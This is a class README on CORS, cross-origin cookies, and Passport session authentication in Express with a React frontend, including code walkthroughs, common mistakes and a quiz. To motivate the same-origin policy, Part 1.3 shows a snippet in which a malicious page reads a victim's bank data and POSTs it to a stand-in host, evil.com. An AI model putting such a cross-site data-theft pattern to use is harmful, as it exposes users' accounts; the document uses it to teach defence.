# Session 05-10-2026 — CORS and Authentication

> Session goal: by the end of this class a student can explain why the browser
> blocks a request to another origin, turn CORS on in Express deliberately
> rather than by copy-paste, send a login cookie across origins, and put a
> Passport middleware in front of a route so that only logged-in users get
> through.

**Prerequisites:** the earlier sessions on REST & MVC and on Pug with Express.
Today we go back to JSON — but this time the page asking for the JSON is a
React app on a different port.

---

## Table of contents

1. [Part 1 — The same-origin policy](#part-1--the-same-origin-policy)
2. [Part 2 — What CORS actually is](#part-2--what-cors-actually-is)
3. [Part 3 — Simple requests and preflights](#part-3--simple-requests-and-preflights)
4. [Part 4 — Turning CORS on in Express](#part-4--turning-cors-on-in-express)
5. [Part 5 — Authentication across origins](#part-5--authentication-across-origins)
6. [Part 6 — Passport and sessions](#part-6--passport-and-sessions)
7. [Part 7 — The gate, and "redirect to login"](#part-7--the-gate-and-redirect-to-login)
8. [Part 8 — Common mistakes](#part-8--common-mistakes)
9. [Part 9 — Live coding plan](#part-9--live-coding-plan)
10. [Part 10 — Exercises & quiz](#part-10--exercises--quiz)
11. [Cheat sheet](#cheat-sheet)

The two folders next to this file are the code:

```
05-10-2026/
├── README.md       <- you are here
├── backend/        <- Express + Passport: server.js + auth.js
└── frontend/       <- React + axios, one component per page
```

---

# Part 1 — The same-origin policy

## 1.1 Start with the problem

Run the backend on port 3000 and the React app on port 5173, then ask React to
fetch the message. Nothing arrives. The console says:

```
Access to XMLHttpRequest at 'http://localhost:3000/auth/me' from origin
'http://localhost:5173' has been blocked by CORS policy: No
'Access-Control-Allow-Origin' header is present on the requested resource.
```

Now the important bit, and the thing most students get wrong for years:

**The request was sent. Express ran. Express answered. The browser read the
answer, decided this page was not allowed to see it, and threw it away.**

Prove it in class. Leave CORS off, refresh React, and look at the Express
terminal — the request is logged. Then run the same request outside a browser:

```bash
curl http://localhost:3000/auth/me
```

`curl` gets the JSON happily. **CORS is a browser rule, not a server rule.**
It is not a firewall and it is not security for your API.

## 1.2 What is an "origin"?

An origin is three things glued together:

```
      scheme   host         port
      ┌────┐   ┌───────┐    ┌──┐
      http  :// localhost  : 5173
```

All three must match, exactly, or it is a different origin.

| This page | ...calling this | Same origin? | Why |
| --- | --- | --- | --- |
| `http://localhost:5173` | `http://localhost:5173/api` | ✅ yes | identical |
| `http://localhost:5173` | `http://localhost:3000` | ❌ no | port differs |
| `http://localhost:5173` | `http://127.0.0.1:5173` | ❌ no | host differs (spelling, not address) |
| `http://localhost:5173` | `https://localhost:5173` | ❌ no | scheme differs |
| `https://app.foo.com` | `https://api.foo.com` | ❌ no | host differs |

That third row surprises everyone. `localhost` and `127.0.0.1` are the same
machine but **not** the same origin — the browser compares text, not routes.

## 1.3 Why does the browser do this?

Because the browser attaches your cookies to requests automatically.

Imagine the policy did not exist. You are logged into your bank at
`bank.com`. You open `cat-pictures.com` in another tab, and its JavaScript does:

```js
const res = await fetch('https://bank.com/account', { credentials: 'include' });
const data = await res.json();          // your balance
await fetch('https://evil.com/steal', { method: 'POST', body: data });
```

Your browser holds a valid `bank.com` session cookie, so the request looks
exactly like you. The same-origin policy is what stops `cat-pictures.com` from
*reading the reply*.

So the default is: **a page may only read responses from its own origin.** CORS
is the mechanism by which a server says "actually, this other origin is fine".

---

# Part 2 — What CORS actually is

CORS = **C**ross-**O**rigin **R**esource **S**haring.

It is not code, a library, or a setting in the browser. It is **a set of
response headers** a server sends to grant permission.

```
   React (localhost:5173)                Express (localhost:3000)
            │
            │  GET /auth/me
            │  Origin: http://localhost:5173        <- browser adds this
            ├──────────────────────────────────────────────►
            │
            │  200 OK
            │  Access-Control-Allow-Origin: http://localhost:5173
            │◄──────────────────────────────────────────────┤
            │
       browser compares the two.
       match   -> React gets the data
       no match / header missing -> blocked, console error
```

The whole mechanism is that comparison. The headers that matter:

| Header | Sent by | Means |
| --- | --- | --- |
| `Origin` | browser, on the request | "this page is asking" |
| `Access-Control-Allow-Origin` | server | "this origin may read the reply" |
| `Access-Control-Allow-Credentials` | server | "...and may send cookies" |
| `Access-Control-Allow-Methods` | server | which verbs are OK (preflight only) |
| `Access-Control-Allow-Headers` | server | which request headers are OK (preflight only) |
| `Access-Control-Max-Age` | server | how long to cache the preflight |

## 2.1 The server does not reject anything

Worth demonstrating, because it cements Part 1. With CORS on for
`localhost:5173`, pretend to be a different site:

```bash
curl -i http://localhost:3000/auth/me -H "Origin: http://evil.example"
```

You still get `200 OK`, the JSON body, **and**
`Access-Control-Allow-Origin: http://localhost:5173`. Express happily answered
a request from `evil.example`. It is the *browser* that would compare
`http://localhost:5173` against `http://evil.example`, see they differ, and
refuse to hand the body to the page.

**Therefore: CORS is not authorisation.** Anything that must actually be
protected needs a login check — which is Part 6 onwards.

---

# Part 3 — Simple requests and preflights

Not every cross-origin request is sent straight away. The browser splits them
in two.

## 3.1 Simple requests

Sent immediately; the browser checks the headers on the way back. A request is
"simple" when **all** of these hold:

- the method is `GET`, `HEAD` or `POST`
- the only headers you set are on a short safe list
- if there is a `Content-Type`, it is one of
  `text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data`

Our `api.get('/auth/me')` is simple — no body, no custom headers.

## 3.2 Preflighted requests

Anything else gets a dress rehearsal first. The browser sends an `OPTIONS`
request, on its own, before yours:

```
OPTIONS /auth/login
Origin: http://localhost:5173
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
```

and expects:

```
204 No Content
Access-Control-Allow-Origin: http://localhost:5173
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
Access-Control-Allow-Headers: content-type
Access-Control-Allow-Credentials: true
```

Only if that passes does the real `POST` go out. Our login is preflighted —
`axios.post` sends `Content-Type: application/json`, which is not on the safe
list.

See it for yourself with CORS turned on:

```bash
curl -i -X OPTIONS http://localhost:3000/auth/login \
  -H "Origin: http://localhost:5173" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type"
```

**This is why the class sees two different error messages.** On page load, the
simple `GET /auth/me` fails with *"No 'Access-Control-Allow-Origin' header is
present"*. On login, the failure is *"Response to preflight request doesn't
pass access control check"* — the real POST never even left.

It is also why `app.use(cors(...))` must come **before** your routes: the
`cors` middleware is what answers that `OPTIONS` request. Your `app.post`
handler never sees it.

## 3.3 Mental model

```
   is it GET/HEAD/POST with only safe headers and a safe Content-Type?
         │                                   │
        yes                                 no
         │                                   │
   send it, check headers           send OPTIONS first.
   on the response                 passes? -> send the real request
                                   fails?  -> real request never sent
```

---

# Part 4 — Turning CORS on in Express

## 4.1 By hand, to show there is no magic

```js
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:5173');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  if (req.method === 'OPTIONS') return res.sendStatus(204); // the preflight
  next();
});
```

Fifteen lines of header-setting. Write this on the board once so nobody thinks
the `cors` package is doing something clever.

## 4.2 The `cors` package, which is what we use

```bash
npm install cors
```

```js
const cors = require('cors');

app.use(cors({ origin: 'http://localhost:5173', credentials: true }));
```

In [`backend/server.js`](backend/server.js) those two lines are **commented
out on purpose**, so Step 1 of the demo is the failure. Uncomment, restart,
refresh — done.

## 4.3 The options worth knowing

```js
app.use(
  cors({
    origin: 'http://localhost:5173', // who may read our replies
    credentials: true, // may they send cookies?
    methods: ['GET', 'POST'], // default: all the common ones
    allowedHeaders: ['Content-Type'], // default: whatever was asked for
    maxAge: 600, // cache the preflight for 10 minutes
  })
);
```

`origin` takes several shapes:

```js
cors()                                        // Allow-Origin: *  — everyone
cors({ origin: 'http://localhost:5173' })     // one exact origin
cors({ origin: ['http://localhost:5173',      // a list
                'https://app.example.com'] })
cors({ origin: /\.example\.com$/ })           // a pattern
cors({ origin: (incoming, cb) => { ... } })   // your own logic
```

Prefer an explicit list. `cors()` with no options is the line people paste at
2am, and it is the one that bites them in Part 5.

## 4.4 Per-route CORS

CORS does not have to be global:

```js
app.get('/public', cors(), (req, res) => res.json({ ok: true }));   // open
app.get('/', ensureLoggedIn, (req, res) => { ... });                 // not open
```

---

# Part 5 — Authentication across origins

This is the part of the session worth slowing down for. Everything so far was
about *reading a response*. Now we want the browser to also *send a cookie*,
and CORS has a second, stricter set of rules for that.

## 5.1 Why a cookie at all?

HTTP has no memory. Two requests from the same browser look like two
strangers. So:

1. you POST your email and password once
2. the server checks them, creates a **session**, and replies with
   `Set-Cookie: connect.sid=...`
3. the browser stores that cookie and attaches it to every later request to
   that server
4. the server looks the session up and knows who you are

The cookie is a **ticket stub**, not your password. It holds a random id; the
server keeps the matching record.

## 5.2 The three switches

A cross-origin cookie needs **all three** of these. Miss one and you get the
single most common bug in this whole topic: *login says success, then the very
next request is 401.*

```
  ① React:    withCredentials: true          <- send/accept the cookie
  ② Express:  cors({ credentials: true })    <- Allow-Credentials: true
  ③ Express:  cors({ origin: '<exact URL>' })<- NOT '*'
```

In our code:

```js
// frontend/src/api.js
export const api = axios.create({
  baseURL: 'http://localhost:3000',
  withCredentials: true, // ①
});
```

```js
// backend/server.js
app.use(cors({ origin: 'http://localhost:5173', credentials: true })); // ② ③
```

With plain `fetch` ① is `credentials: 'include'` in the options object.

## 5.3 Why `*` is banned with credentials

Try it. Change the backend to:

```js
app.use(cors({ origin: '*', credentials: true }));
```

Login, and the console says:

```
The value of the 'Access-Control-Allow-Origin' header in the response must not
be the wildcard '*' when the request's credentials mode is 'include'.
```

The browser is refusing on your behalf. `*` plus cookies would mean "any
website on the internet may make authenticated requests to me and read the
answers" — the exact attack from Part 1.3. So the spec simply forbids the
combination: with credentials you must name the origin.

(This is also why `credentials: true` is the one `cors` option you cannot
sensibly copy-paste without thinking about `origin`.)

## 5.4 Request order on a successful login

```
  ① OPTIONS /auth/login       preflight (POST + Content-Type)
     <- 204, Allow-Origin: http://localhost:5173
            Allow-Credentials: true

  ② POST /auth/login  {email, password}
     <- 200, Set-Cookie: connect.sid=s%3A...; HttpOnly; SameSite=Lax
            Allow-Origin / Allow-Credentials again   <- ② is why the cookie
                                                       is kept, not dropped

  ③ GET /                     Cookie: connect.sid=s%3A...
     <- 200 {"message":"Hello ..."}
```

Step ③ is the moment of truth. Open DevTools → Network → the `/` request →
Request Headers, and check there is a `Cookie:` line. No `Cookie:` line means
switch ①, ② or ③ is missing.

## 5.5 SameSite — the trap that only appears in production

Our cookie is set with `sameSite: 'lax'`, and it works. But
`localhost:5173` → `localhost:3000` is **cross-origin** (different port) while
still being **same-site** (same registrable domain, `localhost`). `Lax`
cookies are sent same-site, so we get away with it.

Deploy the same code to `app.example.com` → `api.example.com` and it is
genuinely **cross-site**. `Lax` cookies are no longer sent, login silently
stops working, and nothing in your code changed. You need:

```js
cookie: {
  httpOnly: true,
  sameSite: 'none',  // explicitly allow cross-site
  secure: true,      // 'none' is IGNORED without HTTPS
}
```

| | `localhost:5173` → `localhost:3000` | `app.example.com` → `api.example.com` |
| --- | --- | --- |
| Cross-origin? | yes | yes |
| Cross-**site**? | **no** (same domain) | **yes** |
| Needs CORS? | yes | yes |
| `sameSite: 'lax'` works? | yes | **no** |
| Needs `'none'` + `secure`? | no | **yes** |

Say this line out loud in class: **"it worked on localhost" is not evidence
that your cookies are configured correctly.**

Those lines are sitting commented in `server.js` next to the cookie config.

## 5.6 Cookies vs tokens, in one minute

Someone will ask "why not just put a JWT in localStorage?"

| | Session cookie (what we use) | Token in `localStorage` |
| --- | --- | --- |
| Sent by | the browser, automatically | your code, in a header |
| CORS credentials rules | apply | do not apply |
| Readable by page JS | no, if `httpOnly` | yes — any XSS steals it |
| CSRF risk | yes, needs protection | no |
| Log out everywhere | easy, delete the session | hard, token stays valid |

Neither is "the secure one". A cookie moves your risk to CSRF; a token in
`localStorage` moves it to XSS. Cookies with `httpOnly` + `sameSite` are the
better default, and they are what Passport's session support expects.

---

# Part 6 — Passport and sessions

[Passport](https://www.passportjs.org/) is middleware that answers one
question: *who is making this request?* It does not decide what they may do —
that is our gate in Part 7.

## 6.1 Install

```bash
npm install passport passport-local express-session bcryptjs
```

- `express-session` — the cookie and the server-side store
- `passport` — the plumbing
- `passport-local` — the "email and password" strategy (there are 500+ others:
  Google, GitHub, JWT…)
- `bcryptjs` — password hashing

## 6.2 Two files

The backend is split in two, and the split is worth explaining:

```
backend/
├── server.js   the wiring + the one protected route   (~55 lines)
└── auth.js     everything about logging in            (~115 lines)
```

`auth.js` exports exactly two things:

```js
module.exports = { router, ensureLoggedIn };
```

`server.js` mounts the router at `/auth` and puts the gate in front of `/`.
That is the entire interface between them — which is the point. Login is a
self-contained concern, so it lives in its own file and the rest of the app
only needs the gate.

## 6.3 Order matters

```js
app.use(express.json());         // 1. so req.body exists
app.use(cors({ ... }));          // 2. before anything that answers a request
app.use(session({ ... }));       // 3. reads/sets the cookie
app.use(passport.initialize());  // 4.
app.use(passport.session());     // 5. reads req.session -> sets req.user
app.use('/auth', authRoutes);    // 6. routes last
app.get('/', ensureLoggedIn, ...);
```

Swap 3 and 5 and you get `Login sessions require session support`. Passport's
session support literally reads `req.session`, so the session must exist first.

There is one more line in `server.js`, easy to overlook and worth a minute:

```js
app.use((req, res, next) => {
  res.set('Cache-Control', 'no-store');
  next();
});
```

Our answers depend on who is logged in, so the browser must never reuse an old
one. Leave it out and `/auth/me` can be served from the browser's cache — which
means a student who turns CORS off again will find that Step 1 *still works*,
because the browser never asks Express at all. Great way to lose twenty
minutes.

## 6.4 Never store a password

```js
passwordHash: bcrypt.hashSync(password, 10);
```

Hashing is one-way: you can check a guess, you cannot recover the original. The
`10` is the cost — each step up doubles the work for you *and* for anyone
brute-forcing the file. Show the class `users.json` after a signup:

```json
[{ "id": 1, "email": "ada@example.com", "passwordHash": "$2a$10$k9SHkhl6LG0..." }]
```

If that file leaks, the passwords are still not in it. Compare with what would
happen if we had stored `"password": "secret123"`.

## 6.5 The three pieces of Passport

**1. The strategy — how do we check a password?**

```js
passport.use(
  new LocalStrategy({ usernameField: 'email' }, (email, password, done) => {
    const user = readUsers().find((u) => u.email === email.toLowerCase());

    if (!user) return done(null, false, { message: 'Wrong email or password' });
    if (!bcrypt.compareSync(password, user.passwordHash))
      return done(null, false, { message: 'Wrong email or password' });

    return done(null, user);
  })
);
```

`done` has three shapes, and mixing them up is the classic Passport bug:

| Call | Means |
| --- | --- |
| `done(err)` | something broke — 500 |
| `done(null, false, { message })` | credentials wrong — 401 |
| `done(null, user)` | success |

`done(null, false)` is **not** an error. A wrong password is a normal outcome.

Note also that both failures give the *same* message. "No account with that
email" is a free account-enumeration tool for an attacker.

**2. `serializeUser` — what goes in the session?**

```js
passport.serializeUser((user, done) => done(null, user.id));
```

Just the id. Runs once, at login. Keeps the session tiny and the user data
fresh.

**3. `deserializeUser` — turn that id back into a user**

```js
passport.deserializeUser((id, done) => {
  const user = readUsers().find((u) => u.id === id);
  done(null, user || false); // false = cookie for a user who no longer exists
});
```

This runs on **every single request** that carries the cookie. It is what sets
`req.user`. In a real app this is a database hit per request — the first thing
to put a cache in front of.

```
   LOGIN (once)                     EVERY REQUEST AFTER
   ────────────                     ───────────────────
   email + password                 Cookie: connect.sid=abc
        │                                │
   LocalStrategy                    session store: abc -> { userId: 1 }
        │                                │
   done(null, user)                 deserializeUser(1)
        │                                │
   serializeUser -> id 1            req.user = { id: 1, email: ... }
        │
   session abc -> { userId: 1 }
   Set-Cookie: connect.sid=abc
```

## 6.6 Login, signup, logout

Login, the short way:

```js
router.post('/login', passport.authenticate('local'));
```

That works, but a wrong password gets an empty `401` with no body — React has
nothing to display. So we pass our own callback:

```js
router.post('/login', (req, res, next) => {
  passport.authenticate('local', (err, user, info) => {
    if (err) return next(err);
    if (!user) return res.status(401).json({ error: info.message });

    req.logIn(user, (err) => {            // THIS creates the session + cookie
      if (err) return next(err);
      res.json({ user: publicUser(user) });
    });
  })(req, res, next);                     // <- note the extra call
});
```

Two things to point at:

- `passport.authenticate(...)` **returns** a middleware function, so with a
  custom callback you have to invoke it yourself: `(req, res, next)`.
- with a custom callback, Passport no longer logs the user in for you.
  `req.logIn` is what does it. Forget it and login "succeeds" with no cookie.

Signup is ordinary code — validate, check for duplicates, hash, save — and
then `req.logIn` so the user is not asked to type it all again.

Logout, since Passport 0.6, takes a callback:

```js
router.post('/logout', (req, res, next) => {
  req.logOut((err) => {
    if (err) return next(err);
    req.session.destroy(() => res.json({ ok: true }));
  });
});
```

`req.logOut` removes the user from the session; `session.destroy` throws the
session away so the old cookie is worthless. Do both.

And the one React depends on:

```js
router.get('/me', (req, res) => {
  res.json({ user: req.isAuthenticated() ? publicUser(req.user) : null });
});
```

`/me` is how a refreshed page finds out whether it is still logged in. The
cookie lives in the browser; React state does not survive F5.

## 6.7 `publicUser`

```js
function publicUser(user) {
  return { id: user.id, email: user.email };
}
```

One small function, used by every response. Without it, `res.json(user)` ships
the bcrypt hash to the browser. Have the class delete it once and look at the
Network tab.

---

# Part 7 — The gate, and "redirect to login"

## 7.1 The middleware

```js
function ensureLoggedIn(req, res, next) {
  if (req.isAuthenticated()) return next();
  res.status(401).json({ error: 'You must be logged in to see this' });
}
```

That is the entire thing, and it lives in `auth.js` alongside the rest of the
login code. `passport.session()` has already run by the time it is called, so
`req.isAuthenticated()` just reports whether `req.user` got set.

`server.js` uses it by slotting it in front of a handler:

```js
app.get('/', ensureLoggedIn, (req, res) => {
  res.json({ message: `Hello ${req.user.email}, this message came from Express.` });
});
```

Express runs middleware left to right. `ensureLoggedIn` either calls `next()`
— and the handler runs — or answers the request itself, and the handler never
runs at all. **That one extra argument is the whole difference between a public
endpoint and a protected one.** Take it out, refresh, and the message is
public again.

Because the gate guarantees it, `req.user` inside the handler needs no
`if (req.user)` check — and if you do remove the gate to prove the point, that
handler crashes on `req.user.email`, which is the same lesson from the other
direction.

## 7.2 Why not `res.redirect('/login')`?

In the Pug app we would have written:

```js
if (!req.isAuthenticated()) return res.redirect('/login');
```

That is correct for a server-rendered site: the browser is doing the
navigating, it follows the 302, and the user lands on the login page.

It is wrong for an API behind axios, and this is a genuinely good discussion
point. `axios.get('/')` would:

1. get the `302`
2. **follow it silently** — you cannot even see it from JavaScript
3. get `200 OK` and the login page's HTML
4. hand React a successful response whose body is HTML

React asked for a message and got a `200` containing `<!doctype html>`. It
cannot tell that apart from success. So:

> **The server says *what* is wrong. The client decides *where* to go.**
>
> API → `401`. Client → navigate to the login page.

## 7.3 The React half

Four components and one axios instance:

```
src/
├── api.js       the axios instance (baseURL + withCredentials)
├── App.jsx      asks GET /auth/me, then decides which page to show
├── Login.jsx    POST /auth/login
├── Signup.jsx   POST /auth/signup
└── Home.jsx     GET / and POST /auth/logout - the protected page
```

**`App.jsx` — who am I, and which page do I show?**

```jsx
const [user, setUser] = useState(null);     // null = nobody logged in
const [page, setPage] = useState('login');  // 'login' or 'signup'

// on load: am I logged in? The cookie knows - React state does not
// survive a refresh, so we have to ask the server every time.
//
// useEffect cannot be async itself - React expects it to return either
// nothing or a cleanup function - so we declare an async function
// inside it and call it.
useEffect(() => {
  async function loadUser() {
    try {
      const res = await api.get('/auth/me');
      setUser(res.data.user);
    } catch (err) {
      setError(errorText(err));
    } finally {
      setLoading(false);
    }
  }

  loadUser();
}, []);

if (loading) return <p>Loading…</p>;
if (error) return <p><strong>{error}</strong></p>;   // the Step 1 screen

if (user) return <Home user={user} onLoggedOut={() => setUser(null)} />;
if (page === 'signup') return <Signup onDone={setUser} onSwitch={...} />;
return <Login onDone={setUser} onSwitch={...} />;
```

Five lines, four outcomes. The `loading` flag is not decoration: without it the
login form flashes for a moment on every refresh, even when you are logged in,
because `/auth/me` has not come back yet. And the `error` line is what the
class sees in Step 1, before CORS is on.

**`Login.jsx` — and `Signup.jsx`, which is the same shape**

```jsx
const res = await api.post('/auth/login', { email, password });
onDone(res.data.user);   // onDone is App's setUser
```

Express has set the session cookie by the time that resolves. Handing the user
up to `App` is what swaps the form for `Home`.

**`Home.jsx` — the protected page, and the redirect**

```jsx
useEffect(() => {
  async function loadMessage() {
    try {
      const res = await api.get('/');
      setMessage(res.data.message);
    } catch (err) {
      if (err.response && err.response.status === 401) onLoggedOut();  // ← the redirect
      else setError(errorText(err));
    }
  }

  loadMessage();
}, []);
```

`onLoggedOut()` is `() => setUser(null)` back in `App`, and that **is** the
redirect: the login form comes back on the next render. In a bigger app you
would use React Router and `<Navigate to="/login" />`; the logic is identical,
and we are skipping the router today to keep each file readable.

Worth pointing out: none of the three pages contains any CORS code. It is
configured once, in `api.js`, and every component gets it for free.

## 7.4 Reading axios errors

```js
function errorText(err) {
  if (err.response) return err.response.data.error || 'Request failed';
  return 'Network Error - is Express running, and is CORS turned on?';
}
```

This small function teaches the whole of Part 1 again:

| | `err.response` | meaning |
| --- | --- | --- |
| CORS block | **undefined** | the browser will not show us the response |
| server down | **undefined** | there was no response |
| 401 | `{ status: 401, data: {...} }` | a real answer we are allowed to read |

A CORS failure and a dead server are **indistinguishable** from JavaScript.
That is deliberate on the browser's part — telling the page *why* it was
blocked would itself leak information. The only place the real reason appears
is the console.

---

# Part 8 — Common mistakes

**1. "I added `cors()` and login still 401s on the next request."**
`cors()` with no options sends `Allow-Origin: *`, and `*` is incompatible with
cookies. Name the origin and add `credentials: true`.

**2. "I set `credentials: true` on the server and it still doesn't work."**
The client has to opt in too: `withCredentials: true` on the axios instance,
or `credentials: 'include'` with `fetch`. Both ends, every time.

**3. `app.use(cors(...))` placed after the routes.**
The preflight `OPTIONS` reaches a route that only handles `GET`, gets `404` or
`200` with no CORS headers, and the real request is never sent. CORS goes
first.

**4. `http://localhost:5173/` in the `origin` option.**
Trailing slash. An origin is scheme + host + port and nothing else. Also
`127.0.0.1` ≠ `localhost`, and `https` ≠ `http`.

**5. `Login sessions require session support`.**
`passport.session()` is above `app.use(session(...))`. Session first.

**6. Custom `authenticate` callback and no `req.logIn`.**
Login returns 200, no cookie is set, every later request is 401.

**7. "It worked on localhost."**
`SameSite=Lax` survives `localhost:5173 → localhost:3000` but not
`app.example.com → api.example.com`. See 5.5.

**8. Trusting CORS to protect the API.**
`curl` ignores it entirely. CORS protects *other people's browsers* from your
API, never your API from attackers.

**9. `res.json(user)` with the hash still in it.**
Use `publicUser`.

**10. Different error messages for "no such email" and "wrong password".**
Account enumeration. Keep them identical.

---

# Part 9 — Live coding plan

Roughly 90 minutes. The repo is already in the Step-1 state — CORS commented
out, `users.json` empty — so you can start cold.

**Step 1 — the failure (15 min)**

```bash
cd backend && npm install && npm start      # terminal 1
cd frontend && npm install && npm run dev   # terminal 2
```

Open http://localhost:5173. It says *Network Error*. Open the console and read
the CORS message out loud. Then:

- show the request **in the Express terminal** — it arrived
- `curl http://localhost:3000/auth/me` — works fine

Land the point: the server answered, the browser binned it.

**Step 2 — turn CORS on (15 min)**

Uncomment the two lines in `server.js`, restart, refresh. Now you reach the
login page. Show the response headers in the Network tab.

Then break it on purpose, one at a time, and read the console each time:
- `origin: 'http://localhost:3001'` → blocked
- `app.use(cors(...))` moved below the routes → preflight fails
- `origin: '*'` with `credentials: true` → the wildcard error

**Step 3 — signup and login (25 min)**

Sign up as `ada@example.com`. Open `users.json` and look at the hash. Log out,
log in, log in wrong. Then the two diagnostics worth building a habit around:

- Network → `/` → Request Headers → is there a `Cookie:` line?
- Application → Cookies → `localhost:3000` → `connect.sid`, HttpOnly ✓

**Step 4 — break the credentials chain (15 min)**

Remove `withCredentials: true` from `api.js`. Login still returns 200 and the
very next request is 401, with *nothing* in the console. Put it back, then
remove `credentials: true` from the server instead. Same symptom, different
cause. This is the bug they will actually hit.

**Step 5 — the gate (20 min)**

Open `auth.js` and read `ensureLoggedIn` — four lines. Then take it out of the
`app.get('/')` line in `server.js`, log out and refresh: the message is public.
Put it back. Discuss 7.2: why 401 and not `res.redirect`.

A good closing question: *which file would you change to add a second
protected route?* (`server.js` only — `auth.js` already exports everything it
needs.)

---

# Part 10 — Exercises & quiz

## Exercises

1. **Allow a second origin.** Start Vite on 5174 as well
   (`npx vite --port 5174`) and make both work. Use the array form of `origin`.
2. **Log the origin.** Add middleware before `cors` that logs
   `req.method`, `req.path` and `req.headers.origin`. Watch the `OPTIONS`
   requests appear only for POSTs.
3. **A second protected route.** Add `GET /secret` behind `ensureLoggedIn`
   and a button for it. How many lines was the gate?
4. **A public route.** Add `GET /health` that works without logging in. Prove
   it with `curl`, and from React while logged out.
5. **Show the session expiring.** Drop `maxAge` to `10 * 1000`. Log in, wait
   fifteen seconds, click something. Trace exactly how the 401 becomes a
   login page.
6. **Names.** Add a `name` field to signup and make the message say
   `Hello Ada`. Which files change? (`publicUser` is one of them.)
7. **Harder — no CORS at all.** Turn the `cors` middleware off and add a Vite
   dev proxy instead (there is a commented example in `vite.config.js`), with
   `baseURL: '/api'`. Why does CORS stop applying? What breaks the moment you
   deploy the frontend as static files?
8. **Harder — `Cache-Control`.** Add a custom header to an axios request.
   Watch a preflight appear for a plain `GET`, then fix it with
   `allowedHeaders`.

## Quiz

1. Is `http://localhost:3000` the same origin as `http://127.0.0.1:3000`?
2. CORS blocked your request. Did the server run your handler?
3. Which side sends the `Origin` header? Which side sends
   `Access-Control-Allow-Origin`?
4. Name one request that is preflighted and one that is not.
5. Why must `app.use(cors(...))` come before the routes?
6. Why can't you use `origin: '*'` together with `credentials: true`?
7. Name the three switches needed for a cross-origin cookie.
8. `serializeUser` runs how often? `deserializeUser`?
9. In a Passport strategy, what is the difference between `done(err)` and
   `done(null, false)`?
10. Why does our protected route answer `401` instead of redirecting?
11. The cookie works on localhost and fails in production. First thing to
    check?
12. Does CORS protect your API from `curl`?

<details>
<summary>Answers</summary>

1. No — the host strings differ, even though they resolve to the same machine.
2. Yes. It ran and it answered; the browser refused to give the response to
   the page.
3. The browser sends `Origin`; the server sends `Access-Control-Allow-Origin`.
4. Not preflighted: `GET /auth/me`. Preflighted: `POST /auth/login` with
   `Content-Type: application/json`.
5. Because `cors` is what answers the preflight `OPTIONS` request. Routes
   below it never see it.
6. Because "any origin may make authenticated requests and read the replies"
   is the attack CORS exists to prevent. The spec forbids the pair.
7. `withCredentials` on the client, `credentials: true` on the server, and an
   exact `origin` (not `*`).
8. `serializeUser` once, at login. `deserializeUser` on every request carrying
   the session cookie.
9. `done(err)` is a crash → 500. `done(null, false)` is a wrong password →
   401. A wrong password is not an error.
10. Because axios follows redirects invisibly, so React would receive `200`
    plus the login page's HTML and could not tell it apart from success.
11. `SameSite`. Localhost is cross-origin but same-site; production is
    cross-site and needs `sameSite: 'none'` with `secure: true`.
12. No. CORS is enforced by browsers only.

</details>

---

# Cheat sheet

**An origin** is `scheme://host:port`. All three must match exactly.

**Express**

```js
const cors = require('cors');

app.use(cors({ origin: 'http://localhost:5173', credentials: true }));  // before routes
app.use(express.json());
app.use(session({ secret: '...', resave: false, saveUninitialized: false,
                  cookie: { httpOnly: true, sameSite: 'lax' } }));
app.use(passport.initialize());
app.use(passport.session());
// ...routes last
```

**Passport**

```js
passport.use(new LocalStrategy({ usernameField: 'email' }, (email, password, done) => {
  // done(err) | done(null, false, { message }) | done(null, user)
}));

passport.serializeUser((user, done) => done(null, user.id));       // at login
passport.deserializeUser((id, done) => done(null, findById(id)));  // every request

req.logIn(user, cb)      // create the session (needed with a custom callback)
req.logOut(cb)           // then req.session.destroy(cb)
req.isAuthenticated()    // boolean
req.user                 // set by deserializeUser
```

**The gate**

```js
function ensureLoggedIn(req, res, next) {
  if (req.isAuthenticated()) return next();
  res.status(401).json({ error: 'You must be logged in to see this' });
}

app.get('/', ensureLoggedIn, handler);
```

**axios**

```js
const api = axios.create({ baseURL: 'http://localhost:3000', withCredentials: true });

err.response        // undefined on a CORS block or a dead server
err.response.status // 401 -> show the login page
```

**Cross-origin cookies — all three or nothing**

| | |
| --- | --- |
| client | `withCredentials: true` / `credentials: 'include'` |
| server | `cors({ credentials: true })` |
| server | `cors({ origin: '<exact origin>' })` — never `'*'` |

**Different sites in production** → `sameSite: 'none'` + `secure: true`.

**Error → cause**

| Console / symptom | Cause |
| --- | --- |
| `No 'Access-Control-Allow-Origin' header` | CORS off, or `origin` does not match |
| `Response to preflight request doesn't pass...` | `cors` after the routes, or method/header not allowed |
| `...must not be the wildcard '*'` | `origin: '*'` with `credentials: true` |
| Login 200, next request 401 | a missing credentials switch |
| `Network Error` with nothing in the console | Express is not running |
| `Login sessions require session support` | `passport.session()` above `session()` |

**CORS is not security.** `curl` ignores it. Protect routes with
`ensureLoggedIn`.
